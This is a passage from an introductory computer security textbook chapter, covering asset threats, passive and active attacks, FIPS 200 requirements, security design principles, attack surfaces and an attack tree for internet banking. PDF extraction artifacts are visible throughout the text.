includes \\r\\nmaking backups of the most recent version of software, can maintain high avail\\ufffeability. A more difficult problem to deal with is software modification that results \\r\\nin a program that still functions but that behaves differently than before, which is a \\r\\nthreat to integrity/authenticity. Computer viruses and related attacks fall into this \\r\\ncategory. A final problem is protection against software piracy. Although certain \\r\\nFigure 1.3 Scope of Computer Security\\r\\nNote: This figure depicts security concerns other than physical security, including controlling of \\r\\naccess to computers systems, safeguarding of data transmitted over communications systems, and \\r\\nsafeguarding of stored data.\\r\\nData\\r\\nSensitive files\\r\\nmust be secure\\r\\n(file security)\\r\\nProcesses representing users\\r\\nUsers making requests\\r\\nGuard\\r\\nAccess to the data\\r\\nmust be controlled\\r\\n(protection)\\r\\nComputer system\\r\\nData\\r\\nProcesses representing users\\r\\nGuard\\r\\n Data must be\\r\\nsecurely transmitted\\r\\nthrough networks\\r\\n(network security)\\r\\nComputer system\\r\\n3\\r\\n4\\r\\n Access to the computer\\r\\nfacility must be controlled\\r\\n(user authentication)\\r\\n2\\r\\n1\\r\\nM01_STAL0611_04_GE_C01.indd 34 10/10/17 9:22 PM\\n\\n\\n1.2 / THREATS, ATTACKS, AND ASSETS 35\\r\\ncountermeasures are available, by and large the problem of unauthorized copying \\r\\nof software has not been solved.\\r\\nDATA Hardware and software security are typically concerns of computing cen\\ufffeter professionals or individual concerns of personal computer users. A much more \\r\\nwidespread problem is data security, which involves files and other forms of data \\r\\ncontrolled by individuals, groups, and business organizations.\\r\\nSecurity concerns with respect to data are broad, encompassing availability, \\r\\nsecrecy, and integrity. In the case of availability, the concern is with the destruction \\r\\nof data files, which can occur either accidentally or maliciously.\\r\\nThe obvious concern with secrecy is the unauthorized reading of data files or \\r\\ndatabases, and this area has been the subject of perhaps more research and effort \\r\\nthan any other area of computer security. A less obvious threat to secrecy involves the \\r\\nanalysis of data and manifests itself in the use of so-called statistical databases, which \\r\\nprovide summary or aggregate information. Presumably, the existence of aggregate \\r\\ninformation does not threaten the privacy of the individuals involved. However, as \\r\\nthe use of statistical databases grows, there is an increasing potential for disclosure \\r\\nof personal information. In essence, characteristics of constituent individuals may be \\r\\nidentified through careful analysis. For example, if one table records the aggregate of \\r\\nthe incomes of respondents A, B, C, and D and another records the aggregate of the \\r\\nincomes of A, B, C, D, and E, the difference between the two aggregates would be the \\r\\nincome of E. This problem is exacerbated by the increasing desire to combine data \\r\\nsets. In many cases, matching several sets of data for consistency at different levels \\r\\nof aggregation requires access to individual units. Thus, the individual units, which \\r\\nare the subject of privacy concerns, are available at various stages in the processing \\r\\nof data sets.\\r\\nFinally, data integrity is a major concern in most installations. Modifications to \\r\\ndata files can have consequences ranging from minor to disastrous.\\r\\nAvailability Confidentiality Integrity\\r\\nHardware Equipment is stolen or \\r\\ndisabled, thus denying \\r\\nservice.\\r\\nAn unencrypted \\r\\nUSB drive is stolen.\\r\\nSoftware Programs are deleted, \\r\\ndenying access to users.\\r\\nAn unauthorized copy of \\r\\nsoftware is made.\\r\\nA working program is modi\\ufffefied, either to cause it to fail \\r\\nduring execution or to cause \\r\\nit to do some unintended task.\\r\\nData Files are deleted, denying \\r\\naccess to users.\\r\\nAn unauthorized read \\r\\nof data is performed. An \\r\\nanalysis of statistical data \\r\\nreveals underlying data.\\r\\nExisting files are modified or \\r\\nnew files are fabricated.\\r\\nCommunication \\r\\nLines and \\r\\nNetworks\\r\\nMessages are destroyed or \\r\\ndeleted. Communication \\r\\nlines or networks are \\r\\nrendered unavailable.\\r\\nMessages are read. The \\r\\ntraffic pattern of messages \\r\\nis observed.\\r\\nMessages are modified,\\r\\ndelayed, reordered, or dupli\\ufffecated. False messages are \\r\\nfabricated.\\r\\nTable 1.3 Computer and Network Assets, with Examples of Threats\\r\\nM01_STAL0611_04_GE_C01.indd 35 10/10/17 9:22 PM\\n\\n\\n36 CHAPTER 1 / OVERVIEW\\r\\nCOMMUNICATION LINES AND NETWORKS Network security attacks can be classified \\r\\nas passive attacks and active attacks. A passive attack attempts to learn or make use of \\r\\ninformation from the system, but does not affect system resources. An active attack \\r\\nattempts to alter system resources or affect their operation.\\r\\nPassive attacks are in the nature of eavesdropping on, or monitoring of, trans\\ufffemissions. The goal of the attacker is to obtain information that is being transmit\\ufffeted. Two types of passive attacks are the release of message contents and traffic \\r\\nanalysis.\\r\\nThe release of message contents is easily understood. A telephone conversation, \\r\\nan electronic mail message, and a transferred file may contain sensitive or confiden\\ufffetial information. We would like to prevent an opponent from learning the contents \\r\\nof these transmissions.\\r\\nA second type of passive attack, traffic analysis, is more subtle. Suppose we \\r\\nhad a way of masking the contents of messages or other information traffic so oppo\\ufffenents, even if they captured the message, could not extract the information from \\r\\nthe message. The common technique for masking contents is encryption. If we had \\r\\nencryption protection in place, an opponent might still be able to observe the pattern\\r\\nof these messages. The opponent could determine the location and identity of com\\ufffemunicating hosts and could observe the frequency and length of messages being \\r\\nexchanged. This information might be useful in guessing the nature of the communi\\ufffecation that was taking place.\\r\\nPassive attacks are very difficult to detect because they do not involve any \\r\\nalteration of the data. Typically, the message traffic is sent and received in an appar\\ufffeently normal fashion and neither the sender nor receiver is aware that a third party \\r\\nhas read the messages or observed the traffic pattern. However, it is feasible to pre\\ufffevent the success of these attacks, usually by means of encryption. Thus, the emphasis \\r\\nin dealing with passive attacks is on prevention rather than detection.\\r\\nActive attacks involve some modification of the data stream or the creation \\r\\nof a false stream, and can be subdivided into four categories: replay, masquerade, \\r\\nmodification of messages, and denial of service.\\r\\nReplay involves the passive capture of a data unit and its subsequent retrans\\ufffemission to produce an unauthorized effect.\\r\\nA masquerade takes place when one entity pretends to be a different entity. \\r\\nA masquerade attack usually includes one of the other forms of active attack. For \\r\\nexample, authentication sequences can be captured and replayed after a valid \\r\\nauthentication sequence has taken place, thus enabling an authorized entity with \\r\\nfew privileges to obtain extra privileges by impersonating an entity that has those \\r\\nprivileges.\\r\\nModification of messages simply means that some portion of a legitimate \\r\\nmessage is altered, or that messages are delayed or reordered, to produce an unau\\ufffethorized effect. For example, a message stating, “Allow John Smith to read confi\\ufffedential file accounts” is modified to say, “Allow Fred Brown to read confidential \\r\\nfile accounts.”\\r\\nThe denial of service prevents or inhibits the normal use or management of \\r\\ncommunication facilities. This attack may have a specific target; for example, an \\r\\nentity may suppress all messages directed to a particular destination (e.g., the security \\r\\nM01_STAL0611_04_GE_C01.indd 36 10/10/17 9:22 PM\\n\\n\\n1.3 / SECURITY FUNCTIONAL REQUIREMENTS 37\\r\\naudit service). Another form of service denial is the disruption of an entire network, \\r\\neither by disabling the network or by overloading it with messages so as to degrade \\r\\nperformance.\\r\\nActive attacks present the opposite characteristics of passive attacks. Whereas \\r\\npassive attacks are difficult to detect, measures are available to prevent their success. \\r\\nOn the other hand, it is quite difficult to prevent active attacks absolutely, because \\r\\nto do so would require physical protection of all communication facilities and paths \\r\\nat all times. Instead, the goal is to detect them and to recover from any disruption \\r\\nor delays caused by them. Because the detection has a deterrent effect, it may also \\r\\ncontribute to prevention.\\r\\n1.3 SECURITY FUNCTIONAL REQUIREMENTS\\r\\nThere are a number of ways of classifying and characterizing the countermeasures \\r\\nthat may be used to reduce vulnerabilities and deal with threats to system assets. In \\r\\nthis section, we view countermeasures in terms of functional requirements, and we \\r\\nfollow the classification defined in FIPS 200 (Minimum Security Requirements for \\r\\nFederal Information and Information Systems). This standard enumerates 17 security\\uffferelated areas with regard to protecting the confidentiality, integrity, and availability of \\r\\ninformation systems and the information processed, stored, and transmitted by those \\r\\nsystems. The areas are defined in Table 1.4.\\r\\nThe requirements listed in FIPS 200 encompass a wide range of counter\\ufffemeasures to security vulnerabilities and threats. Roughly, we can divide these \\r\\ncountermeasures into two categories: those that require computer security technical \\r\\nmeasures (covered in Parts One and Two), either hardware or software, or both; and \\r\\nthose that are fundamentally management issues (covered in Part Three).\\r\\nEach of the functional areas may involve both computer security technical mea\\ufffesures and management measures. Functional areas that primarily require computer \\r\\nsecurity technical measures include access control, identification and authentica\\ufffetion, system and communication protection, and system and information integrity. \\r\\nFunctional areas that primarily involve management controls and procedures include \\r\\nawareness and training; audit and accountability; certification, accreditation, and \\r\\nsecurity assessments; contingency planning; maintenance; physical and environmen\\ufffetal protection; planning; personnel security; risk assessment; and systems and services \\r\\nacquisition. Functional areas that overlap computer security technical measures and \\r\\nmanagement controls include configuration management, incident response, and \\r\\nmedia protection.\\r\\nNote the majority of the functional requirements areas in FIPS 200 are either \\r\\nprimarily issues of management or at least have a significant management com\\ufffeponent, as opposed to purely software or hardware solutions. This may be new to \\r\\nsome readers, and is not reflected in many of the books on computer and informa\\ufffetion security. But as one computer security expert observed, “If you think tech\\ufffenology can solve your security problems, then you don’t understand the problems \\r\\nand you don’t understand the technology” [SCHN00]. This book reflects the need \\r\\nM01_STAL0611_04_GE_C01.indd 37 10/10/17 9:22 PM\\n\\n\\n38 CHAPTER 1 / OVERVIEW\\r\\nAccess Control: Limit information system access to authorized users, processes acting on behalf of authorized \\r\\nusers, or devices (including other information systems) and to the types of transactions and functions that \\r\\nauthorized users are permitted to exercise.\\r\\nAwareness and Training: (i) Ensure that managers and users of organizational information systems are made \\r\\naware of the security risks associated with their activities and of the applicable laws, regulations, and policies \\r\\nrelated to the security of organizational information systems; and (ii) ensure that personnel are adequately \\r\\ntrained to carry out their assigned information security-related duties and responsibilities.\\r\\nAudit and Accountability: (i) Create, protect, and retain information system audit records to the \\r\\nextent needed to enable the monitoring, analysis, investigation, and reporting of unlawful, unauthorized, \\r\\nor inappropriate information system activity; and (ii) ensure that the actions of individual information \\r\\nsystem users can be uniquely traced to those users so they can be held accountable for their \\r\\nactions.\\r\\nCertification, Accreditation, and Security Assessments: (i) Periodically assess the security controls in \\r\\norganizational information systems to determine if the controls are effective in their application; (ii) develop \\r\\nand implement plans of action designed to correct deficiencies and reduce or eliminate vulnerabilities in \\r\\norganizational information systems; (iii) authorize the operation of organizational information systems and \\r\\nany associated information system connections; and (iv) monitor information system security controls on an \\r\\nongoing basis to ensure the continued effectiveness of the controls.\\r\\nConfiguration Management: (i) Establish and maintain baseline configurations and inventories of \\r\\norganizational information systems (including hardware, software, firmware, and documentation) \\r\\nthroughout the respective system development life cycles; and (ii) establish and enforce security \\r\\nconfiguration settings for information technology products employed in organizational information \\r\\nsystems.\\r\\nContingency Planning: Establish, maintain, and implement plans for emergency response, backup \\r\\noperations, and postdisaster recovery for organizational information systems to ensure the availability \\r\\nof critical information resources and continuity of operations in emergency situations.\\r\\nIdentification and Authentication: Identify information system users, processes acting on behalf of users, or \\r\\ndevices, and authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to \\r\\nallowing access to organizational information systems.\\r\\nIncident Response: (i) Establish an operational incident-handling capability for organizational information \\r\\nsystems that includes adequate preparation, detection, analysis, containment, recovery, and user-response \\r\\nactivities; and (ii) track, document, and report incidents to appropriate organizational officials and/or \\r\\nauthorities.\\r\\nMaintenance: (i) Perform periodic and timely maintenance on organizational information systems; and \\r\\n(ii) provide effective controls on the tools, techniques, mechanisms, and personnel used to conduct \\r\\ninformation system maintenance.\\r\\nMedia Protection: (i) Protect information system media, both paper and digital; (ii) limit access to information \\r\\non information system media to authorized users; and (iii) sanitize or destroy information system media before \\r\\ndisposal or release for reuse.\\r\\nPhysical and Environmental Protection: (i) Limit physical access to information systems, equipment, and \\r\\nthe respective operating environments to authorized individuals; (ii) protect the physical plant and support \\r\\ninfrastructure for information systems; (iii) provide supporting utilities for information systems; (iv) protect \\r\\ninformation systems against environmental hazards; and (v) provide appropriate environmental controls in \\r\\nfacilities containing information systems.\\r\\nPlanning: Develop, document, periodically update, and implement security plans for organizational informa\\ufffetion systems that describe the security controls in place or planned for the information systems and the rules \\r\\nof behavior for individuals accessing the information systems.\\r\\nTable 1.4 Security Requirements\\r\\n(Continued)\\r\\nM01_STAL0611_04_GE_C01.indd 38 10/10/17 9:22 PM\\n\\n\\n1.4 / FUNDAMENTAL SECURITY DESIGN PRINCIPLES 39\\r\\nto combine technical and managerial approaches to achieve effective computer \\r\\nsecurity.\\r\\nFIPS 200 provides a useful summary of the principal areas of concern, both \\r\\ntechnical and managerial, with respect to computer security. This book attempts to \\r\\ncover all of these areas.\\r\\n1.4 FUNDAMENTAL SECURITY DESIGN PRINCIPLES\\r\\nDespite years of research and development, it has not been possible to develop secu\\uffferity design and implementation techniques that systematically exclude security flaws \\r\\nand prevent all unauthorized actions. In the absence of such foolproof techniques, it is \\r\\nuseful to have a set of widely agreed design principles that can guide the development \\r\\nof protection mechanisms. The National Centers of Academic Excellence in Infor\\ufffemation Assurance/Cyber Defense, which is jointly sponsored by the U.S. National \\r\\nSecurity Agency and the U. S. Department of Homeland Security, list the following \\r\\nas fundamental security design principles [NCAE13]:\\r\\n• Economy of mechanism\\r\\n• Fail-safe defaults\\r\\n• Complete mediation\\r\\n• Open design\\r\\nPersonnel Security: (i) Ensure that individuals occupying positions of responsibility within organizations \\r\\n(including third-party service providers) are trustworthy and meet established security criteria for those \\r\\npositions; (ii) ensure that organizational information and information systems are protected during and after \\r\\npersonnel actions such as terminations and transfers; and (iii) employ formal sanctions for personnel failing to \\r\\ncomply with organizational security policies and procedures.\\r\\nRisk Assessment: Periodically assess the risk to organizational operations (including mission, functions, \\r\\nimage, or reputation), organizational assets, and individuals, resulting from the operation of organizational \\r\\ninformation systems and the associated processing, storage, or transmission of organizational information.\\r\\nSystems and Services Acquisition: (i) Allocate sufficient resources to adequately protect organizational \\r\\ninformation systems; (ii) employ system development life cycle processes that incorporate information security \\r\\nconsiderations; (iii) employ software usage and installation restrictions; and (iv) ensure that third-party \\r\\nproviders employ adequate security measures to protect information, applications, and/or services outsourced \\r\\nfrom the organization.\\r\\nSystem and Communications Protection: (i) Monitor, control, and protect organizational communications \\r\\n(i.e., information transmitted or received by organizational information systems) at the external boundaries \\r\\nand key internal boundaries of the information systems; and (ii) employ architectural designs, software devel\\ufffeopment techniques, and systems engineering principles that promote effective information security within \\r\\norganizational information systems.\\r\\nSystem and Information Integrity: (i) Identify, report, and correct information and information system flaws \\r\\nin a timely manner; (ii) provide protection from malicious code at appropriate locations within organizational \\r\\ninformation systems; and (iii) monitor information system security alerts and advisories and take appropriate \\r\\nactions in response.\\r\\nSource: Based on FIPS 200\\r\\nM01_STAL0611_04_GE_C01.indd 39 10/10/17 9:22 PM\\n\\n\\n40 CHAPTER 1 / OVERVIEW\\r\\n• Separation of privilege\\r\\n• Least privilege\\r\\n• Least common mechanism\\r\\n• Psychological acceptability\\r\\n• Isolation\\r\\n• Encapsulation\\r\\n• Modularity\\r\\n• Layering\\r\\n• Least astonishment\\r\\nThe first eight listed principles were first proposed in [SALT75] and have with\\ufffestood the test of time. In this section, we briefly discuss each principle.\\r\\nEconomy of mechanism means the design of security measures embodied in \\r\\nboth hardware and software should be as simple and small as possible. The motiva\\ufffetion for this principle is that relatively simple, small design is easier to test and verify \\r\\nthoroughly. With a complex design, there are many more opportunities for an adver\\ufffesary to discover subtle weaknesses to exploit that may be difficult to spot ahead of \\r\\ntime. The more complex the mechanism is, the more likely it is to possess exploitable \\r\\nflaws. Simple mechanisms tend to have fewer exploitable flaws and require less \\r\\nmaintenance. Furthermore, because configuration management issues are simpli\\ufffefied, updating or replacing a simple mechanism becomes a less intensive process. \\r\\nIn practice, this is perhaps the most difficult principle to honor. There is a constant \\r\\ndemand for new features in both hardware and software, complicating the security \\r\\ndesign task. The best that can be done is to keep this principle in mind during system \\r\\ndesign to try to eliminate unnecessary complexity.\\r\\nFail-safe default means access decisions should be based on permission rather \\r\\nthan exclusion. That is, the default situation is lack of access, and the protection \\r\\nscheme identifies conditions under which access is permitted. This approach exhibits \\r\\na better failure mode than the alternative approach, where the default is to per\\ufffemit access. A design or implementation mistake in a mechanism that gives explicit \\r\\npermission tends to fail by refusing permission, a safe situation that can be quickly \\r\\ndetected. On the other hand, a design or implementation mistake in a mechanism that \\r\\nexplicitly excludes access tends to fail by allowing access, a failure that may long go \\r\\nunnoticed in normal use. For example, most file access systems work on this principle \\r\\nand virtually all protected services on client/server systems work this way.\\r\\nComplete mediation means every access must be checked against the access \\r\\ncontrol mechanism. Systems should not rely on access decisions retrieved from \\r\\na cache. In a system designed to operate continuously, this principle requires that, if \\r\\naccess decisions are remembered for future use, careful consideration be given to how \\r\\nchanges in authority are propagated into such local memories. File access systems \\r\\nappear to provide an example of a system that complies with this principle. However, \\r\\ntypically, once a user has opened a file, no check is made to see of permissions change. \\r\\nTo fully implement complete mediation, every time a user reads a field or record \\r\\nin a file, or a data item in a database, the system must exercise access control. This \\r\\nresource-intensive approach is rarely used.\\r\\nM01_STAL0611_04_GE_C01.indd 40 10/10/17 9:22 PM\\n\\n\\n1.4 / FUNDAMENTAL SECURITY DESIGN PRINCIPLES 41\\r\\nOpen design means the design of a security mechanism should be open rather \\r\\nthan secret. For example, although encryption keys must be secret, encryption \\r\\nalgorithms should be open to public scrutiny. The algorithms can then be reviewed \\r\\nby many experts, and users can therefore have high confidence in them. This is the \\r\\nphilosophy behind the National Institute of Standards and Technology (NIST) pro\\ufffegram of standardizing encryption and hash algorithms, and has led to the widespread \\r\\nadoption of NIST-approved algorithms.\\r\\nSeparation of privilege is defined in [SALT75] as a practice in which multiple \\r\\nprivilege attributes are required to achieve access to a restricted resource. A good \\r\\nexample of this is multifactor user authentication, which requires the use of mul\\ufffetiple techniques, such as a password and a smart card, to authorize a user. The term \\r\\nis also now applied to any technique in which a program is divided into parts that \\r\\nare limited to the specific privileges they require in order to perform a specific \\r\\ntask. This is used to mitigate the potential damage of a computer security attack. \\r\\nOne example of this latter interpretation of the principle is removing high privilege \\r\\noperations to another process and running that process with the higher privileges \\r\\nrequired to perform its tasks. Day-to-day interfaces are executed in a lower privi\\ufffeleged process.\\r\\nLeast privilege means every process and every user of the system should operate\\r\\nusing the least set of privileges necessary to perform the task. A good example of the \\r\\nuse of this principle is role-based access control, as will be described in Chapter 4. The \\r\\nsystem security policy can identify and define the various roles of users or processes. \\r\\nEach role is assigned only those permissions needed to perform its functions. Each \\r\\npermission specifies a permitted access to a particular resource (such as read and \\r\\nwrite access to a specified file or directory, and connect access to a given host and \\r\\nport). Unless permission is granted explicitly, the user or process should not be able \\r\\nto access the protected resource. More generally, any access control system should \\r\\nallow each user only the privileges that are authorized for that user. There is also a \\r\\ntemporal aspect to the least privilege principle. For example, system programs or \\r\\nadministrators who have special privileges should have those privileges only when \\r\\nnecessary; when they are doing ordinary activities the privileges should be withdrawn. \\r\\nLeaving them in place just opens the door to accidents.\\r\\nLeast common mechanism means the design should minimize the functions \\r\\nshared by different users, providing mutual security. This principle helps reduce the \\r\\nnumber of unintended communication paths and reduces the amount of hardware \\r\\nand software on which all users depend, thus making it easier to verify if there are \\r\\nany undesirable security implications.\\r\\nPsychological acceptability implies the security mechanisms should not \\r\\ninterfere unduly with the work of users, and at the same time meet the needs of \\r\\nthose who authorize access. If security mechanisms hinder the usability or acces\\ufffesibility of resources, users may opt to turn off those mechanisms. Where possible, \\r\\nsecurity mechanisms should be transparent to the users of the system or at most \\r\\nintroduce minimal obstruction. In addition to not being intrusive or burdensome, \\r\\nsecurity procedures must reflect the user’s mental model of protection. If the pro\\ufffetection procedures do not make sense to the user or if the user, must translate his \\r\\nor her image of protection into a substantially different protocol, the user is likely \\r\\nto make errors.\\r\\nM01_STAL0611_04_GE_C01.indd 41 10/10/17 9:22 PM\\n\\n\\n42 CHAPTER 1 / OVERVIEW\\r\\nIsolation is a principle that applies in three contexts. First, public access systems \\r\\nshould be isolated from critical resources (data, processes, etc.) to prevent disclo\\ufffesure or tampering. In cases where the sensitivity or criticality of the information is \\r\\nhigh, organizations may want to limit the number of systems on which that data are \\r\\nstored and isolate them, either physically or logically. Physical isolation may include \\r\\nensuring that no physical connection exists between an organization’s public access \\r\\ninformation resources and an organization’s critical information. When implement\\ufffeing logical isolation solutions, layers of security services and mechanisms should \\r\\nbe established between public systems and secure systems that is responsible for \\r\\nprotecting critical resources. Second, the processes and files of individual users should \\r\\nbe isolated from one another except where it is explicitly desired. All modern oper\\ufffeating systems provide facilities for such isolation, so individual users have separate, \\r\\nisolated process space, memory space, and file space, with protections for preventing \\r\\nunauthorized access. And finally, security mechanisms should be isolated in the sense \\r\\nof preventing access to those mechanisms. For example, logical access control may \\r\\nprovide a means of isolating cryptographic software from other parts of the host \\r\\nsystem and for protecting cryptographic software from tampering and the keys from \\r\\nreplacement or disclosure.\\r\\nEncapsulation can be viewed as a specific form of isolation based on object\\ufffeoriented functionality. Protection is provided by encapsulating a collection of pro\\ufffecedures and data objects in a domain of its own so that the internal structure of a \\r\\ndata object is accessible only to the procedures of the protected subsystem and the \\r\\nprocedures may be called only at designated domain entry points.\\r\\nModularity in the context of security refers both to the development of secu\\uffferity functions as separate, protected modules, and to the use of a modular architec\\ufffeture for mechanism design and implementation. With respect to the use of separate \\r\\nsecurity modules, the design goal here is to provide common security functions \\r\\nand services, such as cryptographic functions, as common modules. For example, \\r\\nnumerous protocols and applications make use of cryptographic functions. Rather \\r\\nthan implementing such functions in each protocol or application, a more secure \\r\\ndesign is provided by developing a common cryptographic module that can be \\r\\ninvoked by numerous protocols and applications. The design and implementation \\r\\neffort can then focus on the secure design and implementation of a single crypto\\ufffegraphic module, including mechanisms to protect the module from tampering. With \\r\\nrespect to the use of a modular architecture, each security mechanism should be \\r\\nable to support migration to new technology or upgrade of new features without \\r\\nrequiring an entire system redesign. The security design should be modular so that \\r\\nindividual parts of the security design can be upgraded without the requirement to \\r\\nmodify the entire system.\\r\\nLayering refers to the use of multiple, overlapping protection approaches \\r\\naddressing the people, technology, and operational aspects of information systems. \\r\\nBy using multiple, overlapping protection approaches, the failure or circumvention \\r\\nof any individual protection approach will not leave the system unprotected. We will \\r\\nsee throughout this book that a layering approach is often used to provide multiple \\r\\nbarriers between an adversary and protected information or services. This technique \\r\\nis often referred to as defense in depth.\\r\\nM01_STAL0611_04_GE_C01.indd 42 10/10/17 9:22 PM\\n\\n\\n1.5 / ATTACK SURFACES AND ATTACK TREES 43\\r\\nLeast astonishment means a program or user interface should always respond \\r\\nin the way that is least likely to astonish the user. For example, the mechanism for \\r\\nauthorization should be transparent enough to a user that the user has a good intui\\ufffetive understanding of how the security goals map to the provided security mechanism.\\r\\n1.5 ATTACK SURFACES AND ATTACK TREES\\r\\nSection 1.2 provided an overview of the spectrum of security threats and attacks \\r\\nfacing computer and network systems. Section 8.1 will go into more detail about the \\r\\nnature of attacks and the types of adversaries that present security threats. In this \\r\\nsection, we elaborate on two concepts that are useful in evaluating and classifying \\r\\nthreats: attack surfaces and attack trees.\\r\\nAttack Surfaces\\r\\nAn attack surface consists of the reachable and exploitable vulnerabilities in a system \\r\\n[BELL16, MANA11, HOWA03]. Examples of attack surfaces are the following:\\r\\n• Open ports on outward facing Web and other servers, and code listening on \\r\\nthose ports\\r\\n• Services available on the inside of a firewall\\r\\n• Code that processes incoming data, e-mail, XML, office documents, and \\r\\nindustry-specific custom data exchange formats\\r\\n• Interfaces, SQL, and web forms\\r\\n• An employee with access to sensitive information vulnerable to a social engi\\ufffeneering attack\\r\\nAttack surfaces can be categorized in the following way:\\r\\n• Network attack surface: This category refers to vulnerabilities over an enterprise \\r\\nnetwork, wide-area network, or the Internet. Included in this category are net\\ufffework protocol vulnerabilities, such as those used for a denial-of-service attack, \\r\\ndisruption of communications links, and various forms of intruder attacks.\\r\\n• Software attack surface: This refers to vulnerabilities in application, utility, \\r\\nor operating system code. A particular focus in this category is Web server \\r\\nsoftware.\\r\\n• Human attack surface:This category refers to vulnerabilities created by person\\ufffenel or outsiders, such as social engineering, human error, and trusted insiders.\\r\\nAn attack surface analysis is a useful technique for assessing the scale and \\r\\nseverity of threats to a system. A systematic analysis of points of vulnerability makes \\r\\ndevelopers and security analysts aware of where security mechanisms are required. \\r\\nOnce an attack surface is defined, designers may be able to find ways to make the \\r\\nsurface smaller, thus making the task of the adversary more difficult. The attack sur\\ufffeface also provides guidance on setting priorities for testing, strengthening security \\r\\nmeasures, or modifying the service or application.\\r\\nM01_STAL0611_04_GE_C01.indd 43 10/10/17 9:22 PM\\n\\n\\n44 CHAPTER 1 / OVERVIEW\\r\\nAs illustrated in Figure 1.4, the use of layering, or defense in depth, and attack \\r\\nsurface reduction complement each other in mitigating security risk.\\r\\nAttack Trees\\r\\nAn attack tree is a branching, hierarchical data structure that represents a set of \\r\\npotential techniques for exploiting security vulnerabilities [MAUW05, MOOR01, \\r\\nSCHN99]. The security incident that is the goal of the attack is represented as the \\r\\nroot node of the tree, and the ways by which an attacker could reach that goal are \\r\\niteratively and incrementally represented as branches and subnodes of the tree. Each \\r\\nsubnode defines a subgoal, and each subgoal may have its own set of further subgoals, \\r\\nand so on. The final nodes on the paths outward from the root, that is, the leaf nodes, \\r\\nrepresent different ways to initiate an attack. Each node other than a leaf is either \\r\\nan AND-node or an OR-node. To achieve the goal represented by an AND-node, \\r\\nthe subgoals represented by all of that node’s subnodes must be achieved; and for \\r\\nan OR-node, at least one of the subgoals must be achieved. Branches can be labeled \\r\\nwith values representing difficulty, cost, or other attack attributes, so that alternative \\r\\nattacks can be compared.\\r\\nThe motivation for the use of attack trees is to effectively exploit the informa\\ufffetion available on attack patterns. Organizations such as CERT publish security advi\\ufffesories that have enabled the development of a body of knowledge about both general \\r\\nattack strategies and specific attack patterns. Security analysts can use the attack tree \\r\\nto document security attacks in a structured form that reveals key vulnerabilities. The \\r\\nattack tree can guide both the design of systems and applications, and the choice and \\r\\nstrength of countermeasures.\\r\\nFigure 1.4 Defense in Depth and Attack Surface\\r\\nAttack Surface\\r\\nMedium\\r\\nSecurity Risk\\r\\nHigh\\r\\nSecurity Risk\\r\\nLow\\r\\nSecurity Risk\\r\\nDeep\\r\\nLayering\\r\\nShallow\\r\\nSmall Large\\r\\nMedium\\r\\nSecurity Risk\\r\\nM01_STAL0611_04_GE_C01.indd 44 10/10/17 9:22 PM\\n\\n\\n1.5 / ATTACK SURFACES AND ATTACK TREES 45\\r\\nFigure 1.5, based on a figure in [DIMI07], is an example of an attack tree analysis \\r\\nfor an Internet banking authentication application. The root of the tree is the objective \\r\\nof the attacker, which is to compromise a user’s account. The shaded boxes on the tree \\r\\nare the leaf nodes, which represent events that comprise the attacks. The white boxes \\r\\nare categories which consist of one or more specific attack events (leaf nodes). Note \\r\\nthat in this tree, all the nodes other than leaf nodes are OR-nodes. The analysis used \\r\\nto generate this tree considered the three components involved in authentication:\\r\\n• User terminal and user (UT/U): These attacks target the user equipment, \\r\\nincluding the tokens that may be involved, such as smartcards or other password \\r\\ngenerators, as well as the actions of the user.\\r\\n• Communications channel (CC): This type of attack focuses on communication \\r\\nlinks.\\r\\n• Internet banking server (IBS): These types of attacks are offline attack against \\r\\nthe servers that host the Internet banking application.\\r\\nFive overall attack strategies can be identified, each of which exploits one or \\r\\nmore of the three components. The five strategies are as follows:\\r\\nFigure 1.5 An Attack Tree for Internet Banking Authentication\\r\\nBank Account Compromise\\r\\nUser credential compromise\\r\\nUser credential guessing\\r\\nUT/U1a User surveillance\\r\\nUT/U1b Theft of token and\\r\\nhandwritten notes\\r\\nMalicious software\\r\\ninstallation Vulnerability exploit\\r\\nUT/U2a Hidden code\\r\\nUT/U2b Worms\\r\\nUT/U3a Smartcard analyzers\\r\\nUT/U2c E-mails with\\r\\nmalicious code\\r\\nUT/U3b Smartcard reader\\r\\nmanipulator\\r\\nUT/U3c Brute force attacks\\r\\nwith PIN calculators\\r\\nCC2 Snifng\\r\\nUT/U4a Social engineering\\r\\nIBS3 Web site manipulation\\r\\nUT/U4b Web page\\r\\nobfuscation\\r\\nCC1 Pharming\\r\\nRedirection of\\r\\ncommunication toward\\r\\nfraudulent site\\r\\nCC3 Active man-in-the\\r\\nmiddle attacks\\r\\nIBS1 Brute force attacks\\r\\nUser communication\\r\\nwith attacker\\r\\nInjection of commands\\r\\nUse of known authenticated\\r\\nsession by attacker\\r\\nNormal user authentication\\r\\nwith specified session ID\\r\\nCC4 Pre-defined session\\r\\nIDs (session hijacking)\\r\\nIBS2 Security policy\\r\\nviolation\\r\\nM01_STAL0611_04_GE_C01.indd 45 10/10/17 9:22 PM\\n\\n\\n46 CHAPTER 1 / OVERVIEW\\r\\n• User credential compromise: This strategy can be used against many elements \\r\\nof the attack surface. There are procedural attacks, such as monitoring a user’s \\r\\naction to observe a PIN or other credential, or theft of the user’s token or \\r\\nhandwritten notes. An adversary may also compromise token information using \\r\\na variety of token attack tools, such as hacking the smartcard or using a brute \\r\\nforce approach to guess the PIN. Another possible strategy is to embed mali\\ufffecious software to compromise the user’s login and password. An adversary may \\r\\nalso attempt to obtain credential information via the communication channel \\r\\n(sniffing). Finally, an adversary may use various means to engage in communica\\ufffetion with the target user, as shown in Figure 1.5.\\r\\n• Injection of commands: In this type of attack, the attacker is able to intercept \\r\\ncommunication between the UT and the IBS. Various schemes can be used to \\r\\nbe able to impersonate the valid user and so gain access to the banking system.\\r\\n• User credential guessing: It is reported in [HILT06] that brute force \\r\\nattacks against some banking authentication schemes are feasible by send\\ufffeing random usernames and passwords. The attack mechanism is based on \\r\\ndistributed zombie personal computers, hosting automated programs for \\r\\nusername- or password-based calculation.\\r\\n• Security policy violation: For example, violating the bank’s security policy in \\r\\ncombination with weak access control and logging mechanisms, an employee \\r\\nmay cause an internal security incident and expose a customer’s account.\\r\\n• Use of known authenticated session: This type of attack persuades or forces the \\r\\nuser to connect to the IBS with a preset session ID. Once the user authenticates \\r\\nto the server, the attacker may utilize the known session ID to send packets to \\r\\nthe IBS, spoofing the user’s identity.\\r\\nFigure 1.5 provides a thorough view of the different types of attacks on an Inter\\ufffenet banking authentication application. Using this tree as a starting point, security \\r\\nanalysts can assess the risk of each attack and, using the design principles outlined in \\r\\nthe preceding section, design a 